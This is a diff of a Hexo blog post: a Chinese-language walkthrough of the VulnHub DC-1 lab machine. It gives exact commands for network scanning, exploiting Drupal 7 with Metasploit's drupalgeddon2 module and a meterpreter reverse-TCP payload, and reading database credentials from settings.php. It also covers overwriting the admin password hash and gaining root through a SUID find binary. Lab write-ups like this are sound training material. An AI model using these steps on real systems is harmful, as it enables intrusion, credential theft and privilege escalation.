@@ -10,7 +10,7 @@
     
     
     
-    <title>about | Hexo</title>
+    <title>DC1Try | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,23 +161,203 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">about</h1>
+    <h1 class="title">DC1Try</h1>
         
-                <div class="cube-article-header">
-                    <div class="cube-article-date page">
-                        <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-                        <!-- moment.js对象 -->
-                        2024-04-16
-                    </div>
+            <div class="cube-article-header">
+                <div class="cube-article-date">
+                    <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                    <!-- moment.js对象 -->
+                    2024-07-25
                 </div>
-                
+                <div class="cube-article-tags">
+    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+    
+</div>
+            </div>
+            
                     <div class="cube-article-content cube-markdown">
                         
-                            
+                            <h1 id="1下载dc1"><a href="#1下载dc1" class="headerlink" title="1下载dc1"></a>1下载dc1</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+<p>设置kali与dc机为net</p>
+<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>1.看靶机的ip</p>
+<p>net是在同一个网段</p>
+<p>kali是192.168.49.129    49网段</p>
+<p>看ip   ip addr  ifconfig   eth0就是你的网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.49.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/1.png" alt="DC1Try"></p>
+<p>另外一个命令也可以看靶机ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/2.png" alt="DC1Try"></p>
+<p>排除1，2，129，254  知道cd机为 130</p>
+<p>2 查看ip后看靶机开启了端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.49.130</span><br></pre></td></tr></table></figure>
+
+<p>-A 有点激进  启动了太多扫描，如版本，脚本等</p>
+<p><img src="/2024/07/25/DC1Try/3.png" alt="DC1Try"></p>
+<p>看到22，80，111三个端口 ssh，http，还有一个未知</p>
+<p>3  访问ip</p>
+<p>看到网站</p>
+<p>sql。xss试了试不行</p>
+<p>dirsearch 扫一下没啥东西</p>
+<p>3  指纹识别 whatweb</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.49.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/4.png" alt="DC1Try"></p>
+<p>MetaGenerator   Drupal 7</p>
+<p>看到了cms版本还有名字</p>
+<p>4 漏洞利用</p>
+<p>看看msf有没有现成模块</p>
+<p>（1）进入msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>（2）查找相应模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/5.png" alt="DC1Try"></p>
+<p>这个有8个相应模块 一个一个试 发现第五个可以 exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p>
+<p>（3）使用相应模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
+
+<p>（4）查看payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/6.png" alt="DC1Try"></p>
+<p>看到这个php&#x2F;meterpreter&#x2F;reverse_tcp 这个不是老行家</p>
+<p>（5）使用payload</p>
+<p>注意  他的payload试这个 payload要和后面的路径有个空格payloadphp&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>（6）查看需要配置的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/7.png" alt="DC1Try"></p>
+<p>yes的试必须要填的，no的可以不填</p>
+<p>这里一个rhosts需要填</p>
+<p>（7）配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.49.130</span><br></pre></td></tr></table></figure>
+
+<p>(8)启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/8.png" alt="DC1Try"></p>
+<p>session建立</p>
+<p>5 操作dc机</p>
+<p>查看dc-1的基本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<p>获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>python反弹操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/25/DC1Try/9.png" alt="DC1Try"></p>
+<p>ls</p>
+<p>看到flag1.txt</p>
+<p>cat 看一下</p>
+<p>让我们看config file   （setting.php）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;set*&quot;</span><br></pre></td></tr></table></figure>
+
+<p>搜到一个 .&#x2F;sites&#x2F;default&#x2F;settings.php</p>
+<p>cat 一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./sites/default/settings.php</span><br></pre></td></tr></table></figure>
+
+<p>flag2</p>
+<ul>
+<li>Brute force and dictionary attacks aren’t the</li>
+<li>only ways to gain access (and you WILL need access).</li>
+<li>What can you do with these credentials?</li>
+<li>*&#x2F;</li>
+</ul>
+<p>$databases &#x3D; array (<br>  ‘default’ &#x3D;&gt;<br>  array (<br>    ‘default’ &#x3D;&gt;<br>    array (<br>      ‘database’ &#x3D;&gt; ‘drupaldb’,<br>      ‘username’ &#x3D;&gt; ‘dbuser’,<br>      ‘password’ &#x3D;&gt; ‘R0ck3t’,<br>      ‘host’ &#x3D;&gt; ‘localhost’,<br>      ‘port’ &#x3D;&gt; ‘’,<br>      ‘driver’ &#x3D;&gt; ‘mysql’,<br>      ‘prefix’ &#x3D;&gt; ‘’,<br>    ),<br>  ),<br>);</p>
+<p>一个sql数据库</p>
+<p>flag2 说的网站不能爆破</p>
+<p>那用数据库的user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p>看到users表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users\G;</span><br></pre></td></tr></table></figure>
+
+<p>\G的作用将查到的结构旋转90度变成纵向</p>
+<p>看到admin</p>
+<p>pass被加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;*hash*&quot;</span><br></pre></td></tr></table></figure>
+
+<p>.&#x2F;scripts&#x2F;password-hash.sh</p>
+<p>直接运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
+
+<p>“<password1>“ [“<password2>“ [“<password3>“ …]]</p>
+<pre><code>          One or more plan-text passwords enclosed by double quotes. The
+          output hash may be manually entered into the &#123;users&#125;.pass field to
+          change a password via SQL to a known value.
+</code></pre>
+<p>这个意思是可以改pass的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
+
+<p>先生成一个hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&#x27;$S$DIYW.qb1fomQ6ryTAXudbfVFgO1QsmRjD1jC6JnFl6o1vegBlwjR&#x27; where name=&quot;admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>把admin密码换成123456</p>
+<p>访问网站登录</p>
+<p>首页有一个flag3</p>
+<p>看到Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+<p>shadow  &#x2F;etc&#x2F;passwd</p>
+<p>cat &#x2F;etc&#x2F;passwd</p>
+<p>有一个flag4   后面跟了一个路径 &#x2F;home&#x2F;flag4</p>
+<p>cd &#x2F;home&#x2F;flag4</p>
+<p>ls</p>
+<p>发现flag4.txt</p>
+<p>cat flag4.txt</p>
+<p>Can you use this same method to find or access the flag in root?</p>
+<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
+<p>让你访问root下的flag</p>
+<p>直接suid提权为root才可以访问&#x2F;root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>从&#x2F;开始找 -perm 权限 -u&#x3D;s 意思是 用户有特权  -type f就是找的是文件</p>
+<p>2&gt;&#x2F;dev&#x2F;null过滤错误信息</p>
+<p>看到find有s权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/bash&quot; -p \;</span><br></pre></td></tr></table></figure>
+
+<p>发现有执行权限的文件 -p \ 不清楚</p>
+<p>但获得root权限</p>
+<p>根据提示</p>
+<p>cd &#x2F;root</p>
+<p>ls</p>
+<p>cat thefinalflag.txt</p>
+<p>这个靶机就打完了</p>
+<p>总结</p>
+<p>1 nmap，arp-scan 使用</p>
+<p>2 whatweb 指纹识别</p>
+<p>3 sf使用模块payload</p>
+<p>update users set pass&#x3D;’S SSDFTjE6MQfJJx3er.iWGVcIIZD8XvaFmGM.F7ZiDbPlxpC.&#x2F;1X&#x2F;HC’where name&#x3D;“admin”;</p>
+<p>4 mysql修改数据   update users set pass&#x3D;”111” where name&#x3D;”admin”</p>
+<p>5 suid提权</p>
+
                     </div>
 </div>
 
+    <div class="cube-article-nav">
+        <ul>
+            
+                    
+                        <li class="next">
+                            <a href="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+                                ciscn sanic py原型链污染
+                                    <i class="cube-icon cube-next" aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        
+        </ul>
+    </div>
+    
         
+            <!-- TODO 根据theme.comment的内容进行入口选择 -->
+
+                
         </div>
         <div class="cube-right">
             
